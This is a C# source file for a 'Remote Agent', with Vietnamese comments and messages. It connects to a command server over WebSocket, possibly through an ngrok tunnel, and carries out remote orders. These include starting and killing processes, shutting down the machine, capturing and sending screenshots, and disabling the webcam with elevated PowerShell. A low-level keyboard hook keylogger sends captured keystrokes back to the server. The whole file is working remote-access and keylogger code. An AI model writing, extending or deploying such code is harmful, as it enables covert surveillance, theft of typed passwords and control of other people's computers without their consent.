using System;
using System.Net.WebSockets;
using System.Text;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Windows.Forms;
namespace RemoteAgent
{
    class Program
    {
        static ClientWebSocket? webSocket;
        static bool isConnected = false;

        // Keylogger variables
        static bool isKeyloggerRunning = false;
        static StringBuilder keyBuffer = new StringBuilder();
        static CancellationTokenSource? keyloggerCts;

        // Windows API for keyboard hook
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern int GetKeyNameText(int lParam, StringBuilder lpString, int nSize);

        [DllImport("user32.dll")]
        private static extern int MapVirtualKey(int uCode, int uMapType);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        static async Task Main(string[] args)
        {
            Console.WriteLine("===========================================");
            Console.WriteLine("       REMOTE AGENT - Máy bị điều khiển    ");
            Console.WriteLine("===========================================");
            Console.WriteLine();

            string serverUrl = "ws://localhost:5000/ws/agent";

            if (args.Length >= 1)
            {
                var host = args[0];
                // Support both ws:// and wss:// URLs or plain hostname
                if (host.StartsWith("ws://") || host.StartsWith("wss://"))
                {
                    serverUrl = host;
                    if (!serverUrl.EndsWith("/ws/agent"))
                        serverUrl = serverUrl.TrimEnd('/') + "/ws/agent";
                }
                else if (host.Contains("ngrok"))
                {
                    // ngrok URLs use wss://
                    serverUrl = $"wss://{host}/ws/agent";
                }
                else
                {
                    serverUrl = $"ws://{host}:5000/ws/agent";
                }
            }

            Console.WriteLine($"Đang kết nối đến WebServer: {serverUrl}");

            while (true)
            {
                try
                {
                    await ConnectToServer(serverUrl);
                    await ListenForCommands();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Lỗi: {ex.Message}");
                    Console.WriteLine("Đang thử kết nối lại sau 5 giây...");
                    await Task.Delay(5000);
                }
            }
        }

        static async Task ConnectToServer(string url)
        {
            webSocket = new ClientWebSocket();
            await webSocket.ConnectAsync(new Uri(url), CancellationToken.None);
            isConnected = true;
            Console.WriteLine("Đã kết nối thành công!");
        }

        static async Task ListenForCommands()
        {
            var buffer = new byte[4096];

            while (isConnected && webSocket != null && webSocket.State == WebSocketState.Open)
            {
                try
                {
                    var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        isConnected = false;
                        break;
                    }

                    string command = Encoding.UTF8.GetString(buffer, 0, result.Count);
                    Console.WriteLine($"Nhận lệnh: {command}");
                    await ProcessCommand(command);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Lỗi nhận lệnh: {ex.Message}");
                    isConnected = false;
                    break;
                }
            }
        }

        static async Task ProcessCommand(string command)
        {
            try
            {
                var parts = command.Split('|');
                string cmd = parts[0].ToUpper();

                switch (cmd)
                {
                    case "LIST_APPS":
                        await ListApplications();
                        break;
                    case "LIST_PROCESSES":
                        await ListProcesses();
                        break;
                    case "START_PROCESS":
                        if (parts.Length > 1)
                            await StartProcess(parts[1]);
                        break;
                    case "KILL_PROCESS":
                        if (parts.Length > 1)
                            await KillProcess(int.Parse(parts[1]));
                        break;
                    case "SHUTDOWN":
                        await ShutdownComputer();
                        break;
                    case "RESTART":
                        await RestartComputer();
                        break;
                    case "PING":
                        await SendResponse("PONG", "OK");
                        break;
                    case "DISABLE_WEBCAM":
                        await DisableWebcam();
                        break;
                    case "ENABLE_WEBCAM":
                        await EnableWebcam();
                        break;
                    case "SCREENSHOT":
                        await TakeScreenshot();
                        break;
                    case "START_KEYLOGGER":
                        await StartKeylogger();
                        break;
                    case "STOP_KEYLOGGER":
                        await StopKeylogger();
                        break;
                    case "GET_KEYLOG":
                        string keylog = GetKeylog();
                        await SendResponse("KEYLOG", keylog);
                        break;
                    default:
                        await SendResponse("ERROR", "Lệnh không hợp lệ");
                        break;
                }
            }
            catch (Exception ex)
            {
                await SendResponse("ERROR", ex.Message);
            }
        }

        static async Task ListApplications()
        {
            var apps = new List<object>();
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (!string.IsNullOrEmpty(process.MainWindowTitle))
                    {
                        apps.Add(new
                        {
                            Name = process.ProcessName,
                            Title = process.MainWindowTitle,
                            Id = process.Id,
                            Threads = process.Threads.Count,
                            Memory = process.WorkingSet64 / 1024 / 1024 // MB
                        });
                    }
                }
                catch { }
            }
            await SendResponse("APPS", JsonConvert.SerializeObject(apps));
        }

        static async Task ListProcesses()
        {
            var processes = new List<object>();
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    // Skip system processes with no name
                    if (string.IsNullOrWhiteSpace(process.ProcessName))
                        continue;

                    processes.Add(new
                    {
                        Name = process.ProcessName,
                        Id = process.Id,
                        Threads = process.Threads.Count,
                        Memory = process.WorkingSet64 / 1024 / 1024 // MB
                    });
                }
                catch { /* Ignore processes we can't access */ }
            }

            var json = JsonConvert.SerializeObject(processes);
            Console.WriteLine($"Sending {processes.Count} processes, JSON length: {json.Length}");
            await SendResponse("PROCESSES", json);
        }

        static async Task StartProcess(string processName)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = processName,
                    UseShellExecute = true
                });
                await SendResponse("SUCCESS", $"Đã khởi động: {processName}");
            }
            catch (Exception ex)
            {
                await SendResponse("ERROR", $"Không thể khởi động: {ex.Message}");
            }
        }

        static async Task KillProcess(int processId)
        {
            try
            {
                var process = Process.GetProcessById(processId);
                string name = process.ProcessName;
                process.Kill();
                await SendResponse("SUCCESS", $"Đã dừng process: {name} (ID: {processId})");
            }
            catch (Exception ex)
            {
                await SendResponse("ERROR", $"Không thể dừng process: {ex.Message}");
            }
        }

        static async Task ShutdownComputer()
        {
            await SendResponse("SUCCESS", "Máy tính sẽ tắt sau 10 giây...");
            Process.Start("shutdown", "/s /t 10");
        }

        static async Task RestartComputer()
        {
            await SendResponse("SUCCESS", "Máy tính sẽ khởi động lại sau 10 giây...");
            Process.Start("shutdown", "/r /t 10");
        }

        // Windows API để lấy kích thước màn hình
        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);
        const int SM_CXSCREEN = 0;
        const int SM_CYSCREEN = 1;

        static async Task TakeScreenshot()
        {
            try
            {
                int screenWidth = GetSystemMetrics(SM_CXSCREEN);
                int screenHeight = GetSystemMetrics(SM_CYSCREEN);

                using (Bitmap bitmap = new Bitmap(screenWidth, screenHeight))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        // Nén ảnh với chất lượng 30% để truyền nhanh hơn
                        var encoder = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
                        var encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 30L);
                        bitmap.Save(ms, encoder, encoderParams);

                        string base64 = Convert.ToBase64String(ms.ToArray());
                        await SendResponse("SCREENSHOT", base64);
                    }
                }
                Console.WriteLine("Đã chụp màn hình");
            }
            catch (Exception ex)
            {
                await SendResponse("ERROR", $"Không thể chụp màn hình: {ex.Message}");
            }
        }

        static async Task DisableWebcam()
        {
            try
            {
                // BƯỚC 1: Tìm và diệt App Camera đang mở (để tắt màn hình camera đi)
                foreach (var process in Process.GetProcessesByName("WindowsCamera"))
                {
                    process.Kill();
                }

                // BƯỚC 2: Chạy lệnh Disable Driver (Cấm bật lại)
                var psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    // Lệnh PowerShell tìm Camera và Disable nó đi
                    Arguments = "/c powershell -Command \"$cam = Get-PnpDevice -Class Camera -Status OK; if($cam) { Disable-PnpDevice -InstanceId $cam.InstanceId -Confirm:$false }\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    Verb = "runas" // Yêu cầu quyền Admin
                };
                Process.Start(psi)?.WaitForExit();

                await SendResponse("SUCCESS", "Đã đóng App và KHÓA Webcam thành công!");
                Console.WriteLine("Đã tắt Webcam");
            }
            catch (Exception ex)
            {
                await SendResponse("ERROR", $"Lỗi tắt webcam: {ex.Message}");
            }
        }

        static async Task EnableWebcam()
        {
            try
            {
                // BƯỚC 1: Kill App cũ nếu bị treo
                foreach (var process in Process.GetProcessesByName("WindowsCamera"))
                {
                    try { process.Kill(); } catch { }
                }

                // BƯỚC 2: Bật Driver (Cần quyền Admin)
                var psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c powershell -Command \"Get-PnpDevice -Class Camera | ForEach-Object { Enable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false }\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    Verb = "runas"
                };
                var p = Process.Start(psi);
                p?.WaitForExit();

                // BƯỚC 3: Đợi Driver tỉnh ngủ (5 giây)
                await Task.Delay(5000);

                // BƯỚC 4: Nhờ Explorer mở App Camera lên (Khắc phục lỗi không hiện cửa sổ)
                Process.Start(new ProcessStartInfo
                {
                    FileName = "explorer.exe",
                    Arguments = "microsoft.windows.camera:",
                    UseShellExecute = true
                });

                await SendResponse("SUCCESS", "Đã bật Driver và nhờ Explorer mở App Camera!");
                Console.WriteLine("Đã bật Webcam");
            }
            catch (Exception ex)
            {
                await SendResponse("ERROR", $"Lỗi bật webcam: {ex.Message}");
            }
        }

        // ==================== KEYLOGGER FUNCTIONS ====================
        static async Task StartKeylogger()
        {
            if (isKeyloggerRunning)
            {
                await SendResponse("SUCCESS", "Keylogger đang chạy");
                return;
            }

            keyloggerCts = new CancellationTokenSource();
            isKeyloggerRunning = true;
            keyBuffer.Clear();

            // Chạy hook trong thread riêng
            Task.Run(() =>
            {
                try
                {
                    using (var curProcess = Process.GetCurrentProcess())
                    using (var curModule = curProcess.MainModule!)
                    {
                        _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
                    }

                    // Message loop để nhận keyboard events
                    MSG msg;
                    while (!keyloggerCts.Token.IsCancellationRequested && GetMessage(out msg, IntPtr.Zero, 0, 0))
                    {
                        TranslateMessage(ref msg);
                        DispatchMessage(ref msg);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Keylogger error: {ex.Message}");
                }
            }, keyloggerCts.Token);

            Console.WriteLine("Keylogger đã bắt đầu");
            await SendResponse("SUCCESS", "Đã bắt đầu ghi phím");
        }

        static async Task StopKeylogger()
        {
            if (!isKeyloggerRunning)
            {
                await SendResponse("SUCCESS", "Keylogger chưa chạy");
                return;
            }

            isKeyloggerRunning = false;
            keyloggerCts?.Cancel();

            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }

            Console.WriteLine("Keylogger đã dừng");
            await SendResponse("SUCCESS", "Đã dừng ghi phím");
        }

        static string GetKeylog()
        {
            lock (keyBuffer)
            {
                return keyBuffer.ToString();
            }
        }

        static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyLog = "";

                // 1. Bắt các phím đặc biệt trước (Dù UniKey có can thiệp hay không vẫn bắt được)
                bool isSpecial = true;
                switch ((Keys)vkCode)
                {
                    case Keys.Enter: keyLog = "[ENTER]\n"; break;
                    case Keys.Back: keyLog = "[BACK]"; break;
                    case Keys.Space: keyLog = " "; break;
                    case Keys.Tab: keyLog = "[TAB]"; break;
                    case Keys.Escape: keyLog = "[ESC]"; break;
                    case Keys.LShiftKey: case Keys.RShiftKey: keyLog = ""; break; // Bỏ qua Shift lẻ
                    case Keys.LControlKey: case Keys.RControlKey: keyLog = "[CTRL]"; break;
                    case Keys.Delete: keyLog = "[DEL]"; break;
                    case Keys.CapsLock: keyLog = "[CAPS]"; break;
                    case Keys.LWin: case Keys.RWin: keyLog = "[WIN]"; break;
                    default: isSpecial = false; break;
                }

                // 2. Nếu không phải phím đặc biệt, thử dịch sang ký tự
                if (!isSpecial)
                {
                    // Lấy trạng thái Shift/Capslock để biết hoa thường
                    byte[] keyState = new byte[256];
                    GetKeyboardState(keyState);

                    StringBuilder sb = new StringBuilder(2);
                    if (ToUnicode((uint)vkCode, 0, keyState, sb, sb.Capacity, 0) > 0)
                    {
                        keyLog = sb.ToString();
                    }
                    else
                    {
                        // Nếu ToUnicode thất bại (ví dụ phím lạ), ghi luôn mã phím cho chắc
                        // keyLog = "[" + ((Keys)vkCode).ToString() + "]"; 
                        // Hoặc bỏ qua nếu không muốn rác
                    }
                }

                // 3. Gửi vào buffer
                if (!string.IsNullOrEmpty(keyLog))
                {
                    lock (keyBuffer)
                    {
                        keyBuffer.Append(keyLog);
                        if (keyBuffer.Length > 5000) keyBuffer.Remove(0, 1000); // Tránh tràn RAM
                    }
                    // Debug: In ra để test (Nếu chạy WinExe thì không thấy dòng này đâu)
                    // Console.Write(keyLog); 
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Windows API structures
        [StructLayout(LayoutKind.Sequential)]
        struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public POINT pt;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINT
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll")]
        static extern bool TranslateMessage(ref MSG lpMsg);

        [DllImport("user32.dll")]
        static extern IntPtr DispatchMessage(ref MSG lpMsg);

        [DllImport("user32.dll")]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);

        static async Task SendResponse(string type, string data)
        {
            try
            {
                string response = $"{type}|{data}";
                var bytes = Encoding.UTF8.GetBytes(response);
                await webSocket!.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);
                Console.WriteLine($"Gửi: {type}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Lỗi gửi: {ex.Message}");
            }
        }
    }
}
